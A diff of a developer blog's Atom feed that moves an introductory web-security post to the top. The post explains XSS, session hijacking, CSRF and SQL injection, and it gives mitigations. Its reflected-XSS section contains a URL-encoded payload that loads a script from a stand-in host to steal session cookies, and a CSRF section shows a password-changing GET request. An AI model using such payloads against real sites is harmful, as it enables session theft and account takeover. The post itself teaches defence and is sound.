@@ -1,5 +1,116 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-12-08T04:27:03+02:00</updated><id>http://localhost:4000/</id><title type="html">achiral</title><subtitle>achiral offers consulting and custom software development services on the node.js and .NET stacks.
-</subtitle><entry><title type="html">A Really, Really Short Intro To MobX</title><link href="http://localhost:4000/mobx" rel="alternate" type="text/html" title="A Really, Really Short Intro To MobX" /><published>2017-12-07T05:39:37+02:00</published><updated>2017-12-07T05:39:37+02:00</updated><id>http://localhost:4000/mobx</id><content type="html" xml:base="http://localhost:4000/mobx">&lt;p&gt;Redux, although very powerful, has a reputation of not being exactly easy to pick up, especially since you go past simple &lt;em&gt;hello world&lt;/em&gt; type apps and you actually get into the nitty gritty–by that I mean, when you begin to have side-effects (calls to the server come to mind here). Luckily Redux has a little bit of competition in the form of MobX and if you’ve had a frustrating experience with Redux, it might be for you.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-27T16:06:58+03:00</updated><id>http://localhost:4000/</id><title type="html">achiral</title><subtitle>achiral offers consulting and custom software development services on the node.js and .NET stacks.
+</subtitle><entry><title type="html">Understanding Web Application Security</title><link href="http://localhost:4000/web-security" rel="alternate" type="text/html" title="Understanding Web Application Security" /><published>2018-07-28T09:39:37+03:00</published><updated>2018-07-28T09:39:37+03:00</updated><id>http://localhost:4000/web-security</id><content type="html" xml:base="http://localhost:4000/web-security">&lt;p&gt;I can testify that a lot of people confided in me they considered doing this (including yours truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/my-password.jpg&quot; alt=&quot;my-password&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This sort of thing happens more than you would imagine—what a lot of people don’t know is that hackers rely a lot on &lt;em&gt;social engineering&lt;/em&gt; to gain access to systems. &lt;a href=&quot;https://en.wikipedia.org/wiki/Kevin_Mitnick&quot;&gt;Kevin Mitnick&lt;/a&gt; was famous for calling in, pretending to be somebody he wasn’t and asking for somebody’s password in order to “perform some maintenance”.&lt;/p&gt;
+
+&lt;h2 id=&quot;phishing&quot;&gt;Phishing&lt;/h2&gt;
+&lt;p&gt;If you’ve followed the US 2016 election cycle news, you might have heard that John Podesta, Hillary Clinton’s campaign manager, was hacked. He was actually the victim of a &lt;em&gt;phishing&lt;/em&gt; scam whereby he received an email made to look like an authentic email from Google (he was using Gmail) that informed him that he needed to change his password because unauthorized access to his account was detected. He fell for it, clicked on the link which redirected him to a page that looked like a Google page (he didn’t pay attention to the URL, it seems), where he entered his old and &lt;em&gt;supposedly&lt;/em&gt; new credentials.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;But this is a scam, it’s not what I wanted to talk about, because you as a developer cannot do anything about it. I actually want to talk about real  vulnerabilities in the software and how they can be addressed, which means understanding the vectors attackers have at their disposal.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;There are quite a lot of developers that when it comes to web application security they rely on whatever framework they are using to take care of that for them, but don’t really have an understanding of what’s happening behind the scenes. Web application security is quite a complex topic, we will be covering:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Cross-site scripting, also called XSS&lt;/li&gt;
+  &lt;li&gt;Session hijacking&lt;/li&gt;
+  &lt;li&gt;Cross-site request forgery, or CSRF&lt;/li&gt;
+  &lt;li&gt;SQL injection&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Both XSS and SQL Injection are cases of &lt;em&gt;code injection&lt;/em&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;cross-site-scripting&quot;&gt;Cross-Site Scripting&lt;/h2&gt;
+&lt;p&gt;XSS refers to a vulnerability where an attacker is able to “inject” Javascript code that will be run by the application. In my previous article, I’ve discussed the &lt;a href=&quot;http://achiral.io/cors-made-simple&quot;&gt;same-origin&lt;/a&gt; policy concept at length which states that if content from one site is granted permission to access resources on a system, then any content from that site will share these permissions, while content from another site will have to be granted permissions separately.&lt;/p&gt;
+
+&lt;p&gt;&lt;i&gt;A lot of people think that SOP prevents XSS attacks. This is &lt;b&gt;not the case.&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;A typical example of XSS is &lt;em&gt;persistent cross-site scripting&lt;/em&gt;. If a page isn’t properly &lt;em&gt;sanitizing&lt;/em&gt; the user input (a field in a for, for example), a user could actually type in valid Javascript code, which is going to be saved by the application in its database and be subsequently rendered every time it displays a page. Imagine you have a page that is visible to multiple users (such as a product page) which allows for users to add comments. If the page is not escaping user input, it is possible for a malicious user to write actual an script block, which will then be rendered to all users as part of the page HTML. The Javascript code has access to the cookies of that user and it can send that information to the a attacker.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/attack.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;An alternative is the &lt;em&gt;reflected&lt;/em&gt; (or non-persistent) XSS attack, whereby the user’s input is not stored in the database, but returned back in the same way it was inputted. It works like this: say you have a page that allows you to search for products. The user types some text in the search box and clicks the search button which sends a GET request to the server.&lt;/p&gt;
+
+&lt;pre&gt;
+GET http://www.onlineshop.com?search=something
+&lt;/pre&gt;
+
+&lt;p&gt;If the site finds something, it returns a list of results, but if it doesn’t, it’s going to say&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Your search, ‘something’, returned no results.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;…which is just the original, unaltered string. A crafty attacker might see this vulnerability and might send an email to the user asking him to click on a link which for the search term in the query string, contains some nefarious script block. If the user clicks on the link (which is likely because most people don’t hover on links to see where they lead to), the application server won’t be able to find any result, and will return with a &lt;em&gt;not found&lt;/em&gt; page containing the script rendered directly on the page.&lt;/p&gt;
+
+&lt;pre&gt;
+GET http://www.onlineshop.com?
+  search=%3Cscript%2520src%3D%22http%3A%2F%2Fsomesite.com%2Fscript.js%22%3E%3C%2Fscript%3E
+  HTTP/1.1
+&lt;/pre&gt;
+
+&lt;p&gt;This script can then hijack the session cookie, like in the previous example.&lt;/p&gt;
+
+&lt;p&gt;What can we do about it? Actually two things:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Validate inputs: this means checking that the user didn’t try to input any funky stuff and warning him if this is the case.&lt;/li&gt;
+  &lt;li&gt;Sanitize outputs: everything that’s rendered to the page must be HTML escaped. This means that script blocks will be displayed as text, and won’t be part of the DOM, and thus executed.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;If you are developing with Node / Express, there are plenty of packages to help you safeguard against XSS attacks, such as &lt;a href=&quot;https://www.npmjs.com/package/helmet&quot;&gt;helmet&lt;/a&gt; or &lt;a href=&quot;https://www.npmjs.com/package/xssfilter&quot;&gt;xssfilter&lt;/a&gt; etc.&lt;/p&gt;
+
+&lt;h2 id=&quot;session-hijacking&quot;&gt;Session Hijacking&lt;/h2&gt;
+&lt;p&gt;Most web applications use a session mechanism which allows the server hosting the web application to know which user is making a specific request. Sessions usually involve authenticating the user, creating some sort of &lt;em&gt;session_id&lt;/em&gt; (usually a string) and setting a cookie with that value on the user’s browser. Session hijacking is a way of getting to know that string.&lt;/p&gt;
+
+&lt;p&gt;One way to gain access to it is, as I mentioned, cross-site scripting. Another typical way of gaining access to that cookie is by sniffing packets. Since browsers send the cookies associated with a domain for every request, somebody sniffing traffic would be able to see also the value of the session cookie. A typical way to sniff traffic is to set up an unencrypted Wi-Fi hotspot in a public place, and monitor the traffic of the people connecting to it. Does this mean I cannot use my online banking when I am connected to a public hotspot? No, because if the website uses SSL for all requests, the contents of the traffic won’t be intelligible to a man-in-the-middle, and usually major sites like Facebook / Twitter, online banking etc. are pretty well secured. There are however plenty of smaller poorly written sites that only use SSL for the login page, and then pass the session cookie unencrypted to other pages.&lt;/p&gt;
+
+&lt;p&gt;Another way to gain access to a user’s session is to get that user to install a malware on his/hers computer. Since browsers usually store cookies on disk, that malware would be able to access the cookie if it knows where to look for it.&lt;/p&gt;
+
+&lt;p&gt;A yet another way of accomplishing session hijacking is &lt;em&gt;session fixation&lt;/em&gt;. There are plenty of sites that accept a session ID in the URL, such as:&lt;/p&gt;
+
+&lt;pre&gt;
+http://www.website.com?sid=asb1sadasdasdan23123
+&lt;/pre&gt;
+
+&lt;p&gt;The reason why they do it is because a lot of users turn of their cookies, ironically, for security reasons. This however would open them up to scams, like somebody sending them an email which says:&lt;/p&gt;
+
+&lt;blockquote&gt;
+Hey, click on http://www.website.com?sid=asb1sadasdasdan23123, and enter credit card and address information to receive a free bonus on your order.
+&lt;/blockquote&gt;
+
+&lt;p&gt;Since the attacker knows the session id, he/she can also log to that page and see the information inputted by the user.&lt;/p&gt;
+
+&lt;h2 id=&quot;cross-site-request-forgery&quot;&gt;Cross-Site Request Forgery&lt;/h2&gt;
+&lt;p&gt;CSRF is an attack that tricks the victim into submitting a malicious request, and relies on the fact that the user is logged in. Since the browser usually sends the session cookie with the request, the server perceives the request as legitimate. An important part of CSRF attacks is &lt;em&gt;social engineering&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/csfr.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s say a site exposes some functionality in the form of a web request, like so:&lt;/p&gt;
+
+&lt;pre&gt;
+GET https://www.thesite.com/account?password=val HTTP/1.1
+&lt;/pre&gt;
+
+&lt;p&gt;This example is a bit contrived and oversimplified, but you get the picture. If the attacker can get the user to click on a link which points to that link &lt;strong&gt;while logged in&lt;/strong&gt;, that’s going to have the effect of changing the password for the user to whatever the attacker wants. This link can be part of an email, or it can be part of a message on a public board or a website set up by the attacker etc.&lt;/p&gt;
+
+&lt;p&gt;An action that changes the password will more likely be a POST than a GET, but that doesn’t make it CSRF-proof either, because a user can be tricked into submitting a form. Here’s how that would work: you could have a form with a hidden input like so:&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/6862d6a60d2dc4418a38fd81ae69e5bd.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;Using HTML forms with email is not really possible, because a lot of clients disable them or warn about them, but you could redirect the user to a page hosted somewhere. It turns out you don’t even have to trick him/her to click on the submit button, that can be done by the site using Javascript (say by reacting to the document load event).&lt;/p&gt;
+
+&lt;p&gt;How about PUT and DELETE? Turns out that the &lt;em&gt;same-origin policy&lt;/em&gt; helps us here, because attackers cannot do XHR requests from their site to the &lt;em&gt;http://www.thesite.com&lt;/em&gt;. It’s also why for POST attacks a form is being used instead of an POST XHR. SOP blocks that too.&lt;/p&gt;
+
+&lt;h2 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h2&gt;
+&lt;p&gt;And last (in our article), but certainly not least, we have SQL injection. I think most of us remember this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/exploit.png&quot; alt=&quot;exploit&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;For SQL injection to work, you’d have to be writing your SQL queries using string interpolation / concatenation.&lt;/p&gt;
+
+&lt;script src=&quot;https://gist.github.com/toaderflorin/e842b81f3e4d1fef85087134717a1571.js&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;As you can see, the text fits nicely in the query. The way you get around this is by using parameters, which are supported by all database systems.&lt;/p&gt;</content><author><name></name></author><summary type="html">I can testify that a lot of people confided in me they considered doing this (including yours truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:</summary></entry><entry><title type="html">A Really, Really Short Intro To MobX</title><link href="http://localhost:4000/mobx" rel="alternate" type="text/html" title="A Really, Really Short Intro To MobX" /><published>2017-12-07T05:39:37+02:00</published><updated>2017-12-07T05:39:37+02:00</updated><id>http://localhost:4000/mobx</id><content type="html" xml:base="http://localhost:4000/mobx">&lt;p&gt;Redux, although very powerful, has a reputation of not being exactly easy to pick up, especially since you go past simple &lt;em&gt;hello world&lt;/em&gt; type apps and you actually get into the nitty gritty–by that I mean, when you begin to have side-effects (calls to the server come to mind here). Luckily Redux has a little bit of competition in the form of MobX and if you’ve had a frustrating experience with Redux, it might be for you.&lt;/p&gt;
 
 &lt;h2 id=&quot;enter-mobx&quot;&gt;Enter MobX&lt;/h2&gt;
 &lt;p&gt;The philosophy of the two frameworks is somewhat different: while both act as a reactive application store container, Redux leans more towards a functional style of programming which involves state immutability and &lt;em&gt;pure reducers&lt;/em&gt;, whereas MobX actually relies on mutable state because the state is observable.&lt;/p&gt;
@@ -408,118 +519,7 @@ What I did was add an empty div at the end of the parent container, like so:&lt;
 &lt;p&gt;If your browser doesn’t support &lt;em&gt;calc&lt;/em&gt;, there are other ways to do it such as using line-height (which works only for text) or using &lt;em&gt;display: table-cell&lt;/em&gt;. Obviously, these are a bit hackish.&lt;/p&gt;
 
 &lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
-&lt;p&gt;Yes, HTML behaves quite unexpectedly if you are coming from something like WPF. As long as you are aware of some of the gotchas of the spec and the differences between browser implementations, developing in it is actually quite pleasurable.&lt;/p&gt;</content><author><name></name></author><summary type="html">If you have worked with another layout engine other than HTML, you probably think that HTML is really hacky and unpredictable. And you wouldn’t be mistaken to think that: sometimes things expand to fill the available spaces, sometimes they don’t. Sometimes you specify a margin and it is respected. Sometimes it’s not. Most developers would feel your pain, but here’s the thing:</summary></entry><entry><title type="html">Understanding Web Application Security</title><link href="http://localhost:4000/web-security" rel="alternate" type="text/html" title="Understanding Web Application Security" /><published>2017-09-13T09:39:37+03:00</published><updated>2017-09-13T09:39:37+03:00</updated><id>http://localhost:4000/web-security</id><content type="html" xml:base="http://localhost:4000/web-security">&lt;p&gt;I can testify that a lot of people confided in me they considered doing this (including yours truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/my-password.jpg&quot; alt=&quot;my-password&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This sort of thing happens more than you would imagine—what a lot of people don’t know is that hackers rely a lot on &lt;em&gt;social engineering&lt;/em&gt; to gain access to systems. &lt;a href=&quot;https://en.wikipedia.org/wiki/Kevin_Mitnick&quot;&gt;Kevin Mitnick&lt;/a&gt; was famous for calling in, pretending to be somebody he wasn’t and asking for somebody’s password in order to “perform some maintenance”.&lt;/p&gt;
-
-&lt;h2 id=&quot;phishing&quot;&gt;Phishing&lt;/h2&gt;
-&lt;p&gt;If you’ve followed the US 2016 election cycle news, you might have heard that John Podesta, Hillary Clinton’s campaign manager, was hacked. He was actually the victim of a &lt;em&gt;phishing&lt;/em&gt; scam whereby he received an email made to look like an authentic email from Google (he was using Gmail) that informed him that he needed to change his password because unauthorized access to his account was detected. He fell for it, clicked on the link which redirected him to a page that looked like a Google page (he didn’t pay attention to the URL, it seems), where he entered his old and &lt;em&gt;supposedly&lt;/em&gt; new credentials.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;But this is a scam, it’s not what I wanted to talk about, because you as a developer cannot do anything about it. I actually want to talk about real  vulnerabilities in the software and how they can be addressed, which means understanding the vectors attackers have at their disposal.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;There are quite a lot of developers that when it comes to web application security they rely on whatever framework they are using to take care of that for them, but don’t really have an understanding of what’s happening behind the scenes. Web application security is quite a complex topic, we will be covering:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Cross-site scripting, also called XSS&lt;/li&gt;
-  &lt;li&gt;Session hijacking&lt;/li&gt;
-  &lt;li&gt;Cross-site request forgery, or CSRF&lt;/li&gt;
-  &lt;li&gt;SQL injection&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;Both XSS and SQL Injection are cases of &lt;em&gt;code injection&lt;/em&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;cross-site-scripting&quot;&gt;Cross-Site Scripting&lt;/h2&gt;
-&lt;p&gt;XSS refers to a vulnerability where an attacker is able to “inject” Javascript code that will be run by the application. In my previous article, I’ve discussed the &lt;a href=&quot;http://achiral.io/cors-made-simple&quot;&gt;same-origin&lt;/a&gt; policy concept at length which states that if content from one site is granted permission to access resources on a system, then any content from that site will share these permissions, while content from another site will have to be granted permissions separately.&lt;/p&gt;
-
-&lt;p&gt;&lt;i&gt;A lot of people think that SOP prevents XSS attacks. This is &lt;b&gt;not the case.&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;
-
-&lt;p&gt;A typical example of XSS is &lt;em&gt;persistent cross-site scripting&lt;/em&gt;. If a page isn’t properly &lt;em&gt;sanitizing&lt;/em&gt; the user input (a field in a for, for example), a user could actually type in valid Javascript code, which is going to be saved by the application in its database and be subsequently rendered every time it displays a page. Imagine you have a page that is visible to multiple users (such as a product page) which allows for users to add comments. If the page is not escaping user input, it is possible for a malicious user to write actual an script block, which will then be rendered to all users as part of the page HTML. The Javascript code has access to the cookies of that user and it can send that information to the a attacker.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/attack.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;An alternative is the &lt;em&gt;reflected&lt;/em&gt; (or non-persistent) XSS attack, whereby the user’s input is not stored in the database, but returned back in the same way it was inputted. It works like this: say you have a page that allows you to search for products. The user types some text in the search box and clicks the search button which sends a GET request to the server.&lt;/p&gt;
-
-&lt;pre&gt;
-GET http://www.onlineshop.com?search=something
-&lt;/pre&gt;
-
-&lt;p&gt;If the site finds something, it returns a list of results, but if it doesn’t, it’s going to say&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Your search, ‘something’, returned no results.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;…which is just the original, unaltered string. A crafty attacker might see this vulnerability and might send an email to the user asking him to click on a link which for the search term in the query string, contains some nefarious script block. If the user clicks on the link (which is likely because most people don’t hover on links to see where they lead to), the application server won’t be able to find any result, and will return with a &lt;em&gt;not found&lt;/em&gt; page containing the script rendered directly on the page.&lt;/p&gt;
-
-&lt;pre&gt;
-GET http://www.onlineshop.com?
-  search=%3Cscript%2520src%3D%22http%3A%2F%2Fsomesite.com%2Fscript.js%22%3E%3C%2Fscript%3E
-  HTTP/1.1
-&lt;/pre&gt;
-
-&lt;p&gt;This script can then hijack the session cookie, like in the previous example.&lt;/p&gt;
-
-&lt;p&gt;What can we do about it? Actually two things:&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Validate inputs: this means checking that the user didn’t try to input any funky stuff and warning him if this is the case.&lt;/li&gt;
-  &lt;li&gt;Sanitize outputs: everything that’s rendered to the page must be HTML escaped. This means that script blocks will be displayed as text, and won’t be part of the DOM, and thus executed.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;If you are developing with Node / Express, there are plenty of packages to help you safeguard against XSS attacks, such as &lt;a href=&quot;https://www.npmjs.com/package/helmet&quot;&gt;helmet&lt;/a&gt; or &lt;a href=&quot;https://www.npmjs.com/package/xssfilter&quot;&gt;xssfilter&lt;/a&gt; etc.&lt;/p&gt;
-
-&lt;h2 id=&quot;session-hijacking&quot;&gt;Session Hijacking&lt;/h2&gt;
-&lt;p&gt;Most web applications use a session mechanism which allows the server hosting the web application to know which user is making a specific request. Sessions usually involve authenticating the user, creating some sort of &lt;em&gt;session_id&lt;/em&gt; (usually a string) and setting a cookie with that value on the user’s browser. Session hijacking is a way of getting to know that string.&lt;/p&gt;
-
-&lt;p&gt;One way to gain access to it is, as I mentioned, cross-site scripting. Another typical way of gaining access to that cookie is by sniffing packets. Since browsers send the cookies associated with a domain for every request, somebody sniffing traffic would be able to see also the value of the session cookie. A typical way to sniff traffic is to set up an unencrypted Wi-Fi hotspot in a public place, and monitor the traffic of the people connecting to it. Does this mean I cannot use my online banking when I am connected to a public hotspot? No, because if the website uses SSL for all requests, the contents of the traffic won’t be intelligible to a man-in-the-middle, and usually major sites like Facebook / Twitter, online banking etc. are pretty well secured. There are however plenty of smaller poorly written sites that only use SSL for the login page, and then pass the session cookie unencrypted to other pages.&lt;/p&gt;
-
-&lt;p&gt;Another way to gain access to a user’s session is to get that user to install a malware on his/hers computer. Since browsers usually store cookies on disk, that malware would be able to access the cookie if it knows where to look for it.&lt;/p&gt;
-
-&lt;p&gt;A yet another way of accomplishing session hijacking is &lt;em&gt;session fixation&lt;/em&gt;. There are plenty of sites that accept a session ID in the URL, such as:&lt;/p&gt;
-
-&lt;pre&gt;
-http://www.website.com?sid=asb1sadasdasdan23123
-&lt;/pre&gt;
-
-&lt;p&gt;The reason why they do it is because a lot of users turn of their cookies, ironically, for security reasons. This however would open them up to scams, like somebody sending them an email which says:&lt;/p&gt;
-
-&lt;blockquote&gt;
-Hey, click on http://www.website.com?sid=asb1sadasdasdan23123, and enter credit card and address information to receive a free bonus on your order.
-&lt;/blockquote&gt;
-
-&lt;p&gt;Since the attacker knows the session id, he/she can also log to that page and see the information inputted by the user.&lt;/p&gt;
-
-&lt;h2 id=&quot;cross-site-request-forgery&quot;&gt;Cross-Site Request Forgery&lt;/h2&gt;
-&lt;p&gt;CSRF is an attack that tricks the victim into submitting a malicious request, and relies on the fact that the user is logged in. Since the browser usually sends the session cookie with the request, the server perceives the request as legitimate. An important part of CSRF attacks is &lt;em&gt;social engineering&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/csfr.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Let’s say a site exposes some functionality in the form of a web request, like so:&lt;/p&gt;
-
-&lt;pre&gt;
-GET https://www.thesite.com/account?password=val HTTP/1.1
-&lt;/pre&gt;
-
-&lt;p&gt;This example is a bit contrived and oversimplified, but you get the picture. If the attacker can get the user to click on a link which points to that link &lt;strong&gt;while logged in&lt;/strong&gt;, that’s going to have the effect of changing the password for the user to whatever the attacker wants. This link can be part of an email, or it can be part of a message on a public board or a website set up by the attacker etc.&lt;/p&gt;
-
-&lt;p&gt;An action that changes the password will more likely be a POST than a GET, but that doesn’t make it CSRF-proof either, because a user can be tricked into submitting a form. Here’s how that would work: you could have a form with a hidden input like so:&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/6862d6a60d2dc4418a38fd81ae69e5bd.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;Using HTML forms with email is not really possible, because a lot of clients disable them or warn about them, but you could redirect the user to a page hosted somewhere. It turns out you don’t even have to trick him/her to click on the submit button, that can be done by the site using Javascript (say by reacting to the document load event).&lt;/p&gt;
-
-&lt;p&gt;How about PUT and DELETE? Turns out that the &lt;em&gt;same-origin policy&lt;/em&gt; helps us here, because attackers cannot do XHR requests from their site to the &lt;em&gt;http://www.thesite.com&lt;/em&gt;. It’s also why for POST attacks a form is being used instead of an POST XHR. SOP blocks that too.&lt;/p&gt;
-
-&lt;h2 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h2&gt;
-&lt;p&gt;And last (in our article), but certainly not least, we have SQL injection. I think most of us remember this:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/exploit.png&quot; alt=&quot;exploit&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;For SQL injection to work, you’d have to be writing your SQL queries using string interpolation / concatenation.&lt;/p&gt;
-
-&lt;script src=&quot;https://gist.github.com/toaderflorin/e842b81f3e4d1fef85087134717a1571.js&quot;&gt;&lt;/script&gt;
-
-&lt;p&gt;As you can see, the text fits nicely in the query. The way you get around this is by using parameters, which are supported by all database systems.&lt;/p&gt;</content><author><name></name></author><summary type="html">I can testify that a lot of people confided in me they considered doing this (including yours truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:</summary></entry><entry><title type="html">CORS Made Simple</title><link href="http://localhost:4000/cors-made-simple" rel="alternate" type="text/html" title="CORS Made Simple" /><published>2017-09-09T06:39:37+03:00</published><updated>2017-09-09T06:39:37+03:00</updated><id>http://localhost:4000/cors-made-simple</id><content type="html" xml:base="http://localhost:4000/cors-made-simple">&lt;p&gt;CORS stands for &lt;em&gt;Cross-Origin Resource Sharing&lt;/em&gt; and if you’ve built rich client applications that communicate with an API via REST, you have probably crossed paths with something known as &lt;em&gt;same-origin policy&lt;/em&gt;. What this policy refers to is that an application cannot access resources via &lt;a href=&quot;https://www.w3schools.com/xml/xml_http.asp&quot;&gt;XMLHttpRequest&lt;/a&gt; or the &lt;a href=&quot;https://developers.google.com/web/updates/2015/03/introduction-to-fetch&quot;&gt;Fetch API&lt;/a&gt; that come from a different URL than where the page was originally served from.&lt;/p&gt;
+&lt;p&gt;Yes, HTML behaves quite unexpectedly if you are coming from something like WPF. As long as you are aware of some of the gotchas of the spec and the differences between browser implementations, developing in it is actually quite pleasurable.&lt;/p&gt;</content><author><name></name></author><summary type="html">If you have worked with another layout engine other than HTML, you probably think that HTML is really hacky and unpredictable. And you wouldn’t be mistaken to think that: sometimes things expand to fill the available spaces, sometimes they don’t. Sometimes you specify a margin and it is respected. Sometimes it’s not. Most developers would feel your pain, but here’s the thing:</summary></entry><entry><title type="html">CORS Made Simple</title><link href="http://localhost:4000/cors-made-simple" rel="alternate" type="text/html" title="CORS Made Simple" /><published>2017-09-09T06:39:37+03:00</published><updated>2017-09-09T06:39:37+03:00</updated><id>http://localhost:4000/cors-made-simple</id><content type="html" xml:base="http://localhost:4000/cors-made-simple">&lt;p&gt;CORS stands for &lt;em&gt;Cross-Origin Resource Sharing&lt;/em&gt; and if you’ve built rich client applications that communicate with an API via REST, you have probably crossed paths with something known as &lt;em&gt;same-origin policy&lt;/em&gt;. What this policy refers to is that an application cannot access resources via &lt;a href=&quot;https://www.w3schools.com/xml/xml_http.asp&quot;&gt;XMLHttpRequest&lt;/a&gt; or the &lt;a href=&quot;https://developers.google.com/web/updates/2015/03/introduction-to-fetch&quot;&gt;Fetch API&lt;/a&gt; that come from a different URL than where the page was originally served from.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/cors.png&quot; alt=&quot;cors&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
 
